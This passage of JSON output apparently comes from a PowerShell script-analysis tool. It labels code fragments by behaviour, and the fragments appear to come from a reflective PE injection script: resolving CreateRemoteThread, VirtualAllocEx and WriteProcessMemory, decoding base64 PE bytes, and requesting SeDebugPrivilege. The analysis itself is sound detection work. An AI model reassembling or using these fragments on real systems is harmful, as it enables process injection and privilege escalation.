                                "$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES"
                            ],
                            "name": "action:Member/Add"
                        },
                        {
                            "lines": [
                                "Throw \"Cannot compare byte arrays of different size\"",
                                "elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)",
                                "elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)",
                                "if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)",
                                "if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)"
                            ],
                            "name": "action:Object/Compare"
                        },
                        {
                            "lines": [
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))",
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))",
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))",
                                "$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')",
                                "$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')",
                                "$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)",
                                "$NtHeadersInfo = New-Object System.Object",
                                "$PEInfo = New-Object System.Object",
                                "$Parameters = (New-Object Type[](0)),",
                                "$Win32Constants = New-Object System.Object",
                                "$Win32Functions = New-Object System.Object",
                                "$Win32Types = New-Object System.Object",
                                "$tmpPtr = New-Object IntPtr",
                                "if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))",
                                "if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {"
                            ],
                            "name": "action:Object/New"
                        },
                        {
                            "lines": [
                                "$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId"
                            ],
                            "name": "action:Object/Select"
                        },
                        {
                            "lines": [
                                "$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId",
                                "$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)",
                                "Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop"
                            ],
                            "name": "action:Process/Get"
                        },
                        {
                            "lines": [
                                "Start-Sleep -Seconds 1"
                            ],
                            "name": "action:Process/Start"
                        },
                        {
                            "lines": [
                                "$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')"
                            ],
                            "name": "action:Win32.Library/Get"
                        },
                        {
                            "lines": [
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"GetProcAddress\") #Kernel32 loaded to the same address for all processes"
                            ],
                            "name": "action:Win32.Library/GetProcAddress"
                        },
                        {
                            "lines": [
                                "$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"LoadLibraryA\") #Kernel32 loaded to the same address for all processes"
                            ],
                            "name": "action:Win32.Library/Load"
                        },
                        {
                            "lines": [
                                "$Processors = Get-WmiObject -Class Win32_Processor"
                            ],
                            "name": "action:Wmi.Object/Get"
                        },
                        {
                            "lines": [
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000"
                            ],
                            "name": "observable:encoding.binary"
                        },
                        {
                            "lines": [
                                "$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges",
                                "$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread",
                                "$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread",
                                "$DllList = @(\"msvcr70d.dll\", \"msvcr71d.dll\", \"msvcr80d.dll\", \"msvcr90d.dll\", \"msvcr100d.dll\", \"msvcr110d.dll\", \"msvcr70.dll\" `",
                                "$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary",
                                "$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread",
                                "$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread",
                                "$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA",
                                "$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress",
                                "$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress",
                                "$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf",
                                "$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process",
                                "$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")",
                                "$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA",
                                "$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree",
                                "$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA",
                                "$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx",
                                "$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess",
                                "$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken",
                                "$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory",
                                "$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc",
                                "$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx",
                                "$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree",
                                "$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx",
                                "$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect",
                                "$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject",
                                "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory",
                                "$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy",
                                "$memsetAddr = Get-ProcAddress msvcrt.dll memset",
                                ", \"msvcr71.dll\", \"msvcr80.dll\", \"msvcr90.dll\", \"msvcr100.dll\", \"msvcr110.dll\")",
                                "Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }",
                                "[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"Kernel32.dll\")",
                                "[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(\"KernelBase.dll\")",
                                "[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(\"mscoree.dll\")"
                            ],
                            "name": "observable:file.pe"
                        },
                        {
                            "lines": [
                                "$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, \"SeDebugPrivilege\", $PLuid)"
                            ],
                            "name": "observable:redTeam.Nishang.AccessControl/PrivilegeEscalation"
                        }
                    ],
                    "length": 141036,
                    "timestamp": "2024-08-01T15:54:10.086Z"
                },
                {
                    "hash": "E357A3562216C5154F7C185BFF4D2A2894DB4328B0A67E3AE13B7BB384D8EF5E",
                    "intentions": [
                        {
                            "lines": [
                                "Write-Verbose \"Calling function with WString return type\"",
                                "if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)"
                            ],
                            "name": "action:Content/Get"
                        },
                        {
                            "lines": [
                                "[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)",
                                "[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)"
                            ],
                            "name": "action:DotNet.Base64/Convert"
                        },
                        {
                            "lines": [
                                "$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)"
                            ],
                            "name": "action:DotNet.UnmanagedCode/Invoke"
                        },
                        {
                            "lines": [
                                "$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId"
                            ],
                            "name": "action:Object/Select"
                        },
                        {
                            "lines": [
                                "$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId",
                                "$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)",
                                "Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop"
                            ],
                            "name": "action:Process/Get"
                        },
                        {
                            "lines": [
                                "$Processors = Get-WmiObject -Class Win32_Processor"
                            ],
                            "name": "action:Wmi.Object/Get"
                        }
                    ],
                    "length": 7604,
                    "timestamp": "2024-08-01T15:54:10.118Z"
                },
                {
                    "hash": "6975FA1EB4AC79CC3746E632351584A05E984DE303628CD3C3F8C0638D7BCE3A",
                    "intentions": [
                        {
                            "lines": [
                                "if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {"
                            ],
                            "name": "action:DotNet.Environment/Use"
                        },
                        {
                            "lines": [
                                "$CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])",
                                "$GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])",
                                "$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])",
                                "$NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])",
                                "$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])",
                                "$ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])",
                                "$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])",
                                "$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])"
                            ],
                            "name": "action:DotNet.Type/Reflect"
                        },
                        {
                            "lines": [
                                "$AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)",
                                "$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)",
                                "$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)",
                                "$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)",
                                "$GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)",
                                "$GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)",
                                "$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)",
                                "$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)",
                                "$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)",
                                "$ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)",
                                "$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)",
                                "$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)",
                                "$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)",
                                "$LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)",
                                "$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)",
                                "$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)",
                                "$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)",
                                "$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)",
                                "$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)",
                                "$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)",
                                "$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)",
                                "$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)",
                                "$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)",
                                "$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)",
                                "$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)",
                                "$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)",
                                "$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)"
                            ],
                            "name": "action:DotNet.UnmanagedCode/Invoke"
                        },
                        {
                            "lines": [
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset",
                                "$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle",
                                "$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect"
                            ],
                            "name": "action:Member/Add"
                        },
                        {
                            "lines": [
                                "$Win32Functions = New-Object System.Object",
                                "if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {"
                            ],
                            "name": "action:Object/New"
                        },
                        {
                            "lines": [
                                "$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges",
                                "$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread",
                                "$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread",
                                "$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary",
                                "$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread",
                                "$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread",
                                "$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA",
                                "$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress",
                                "$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress",
                                "$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf",
                                "$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process",
                                "$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA",
                                "$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree",
                                "$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA",
                                "$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx",
                                "$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess",
                                "$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken",
                                "$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory",
                                "$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc",
                                "$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx",
                                "$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree",
                                "$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx",
                                "$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect",
                                "$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject",
                                "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory",
                                "$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy",
                                "$memsetAddr = Get-ProcAddress msvcrt.dll memset"
                            ],
                            "name": "observable:file.pe"
                        }
                    ],
                    "length": 12115,
                    "timestamp": "2024-08-01T15:54:10.141Z"
                },
                {
                    "hash": "6B2A92D1AD7611067A6CFEE6399EED0705EEFD39ACCB979F39B4F74803A581B8",
                    "intentions": [
                        {
                            "lines": [
                                "{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }"
                            ],
                            "name": "observable:file.pe"
                        }
                    ],
                    "length": 80,
                    "timestamp": "2024-08-01T15:54:10.159Z"
                },
                {
                    "hash": "53029AD10150113EF0B22B79275A8A5855BE6038A7463B2FB107E63CFBCD2AFC",
                    "intentions": [
                        {
                            "lines": [
                                "$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)",
                                "$DllCharacteristicsType = $TypeBuilder.CreateType()",
                                "$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()",
                                "$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()",
                                "$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()",
                                "$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()",
                                "$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()",
                                "$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()",
                                "$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()",
                                "$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()",
                                "$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()",
                                "$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()",
                                "$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()",
                                "$LUID = $TypeBuilder.CreateType()",
                                "$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()",
                                "$MachineType = $TypeBuilder.CreateType()",
                                "$MagicType = $TypeBuilder.CreateType()",
                                "$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)",
                                "$SubSystemType = $TypeBuilder.CreateType()",
                                "$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)",
                                "$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)",
                                "$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null",
